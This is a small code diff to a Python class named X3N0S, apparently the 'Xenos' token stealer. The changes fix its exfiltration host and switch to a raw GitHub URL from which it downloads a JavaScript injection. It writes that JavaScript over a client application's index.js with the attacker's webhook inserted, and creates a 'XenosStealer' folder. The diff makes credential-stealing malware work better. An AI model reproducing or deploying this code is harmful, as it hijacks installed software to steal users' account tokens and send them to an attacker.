@@ -5,7 +5,7 @@ import os, re, threading, urllib.request
 
 class X3N0S:
     def __init__(self):
-        self.host = "https://yourwebsite.com/"
+        self.host = "https://yourwebsite.com"
         self.all_tokens = []
         self.valid_tokens = []
         self.paths = {
@@ -69,7 +69,7 @@ class X3N0S:
                 for file in os.listdir(end_path):
                     if "index.js" in file.lower():
                         os.makedirs(end_path+"\\XenosStealer")
-                        open(end_path+"index.js", 'w', encoding="UTF-8").write((urllib.request.urlopen(urllib.request.Request("https://github.com/KanekiWeb/Xenos/blob/main/Grabber/Injection/injection.js")).read().decode('utf-8')).replace("%WEBHOOK_LINK%", self.host))
+                        open(end_path+"index.js", 'w', encoding="UTF-8").write((urllib.request.urlopen(urllib.request.Request("https://raw.githubusercontent.com/KanekiWeb/Xenos/main/Grabber/Injection/injection.js")).read().decode('utf-8')).replace("%WEBHOOK_LINK%", self.host))
             except:pass
 
     def __KillInstance(self):
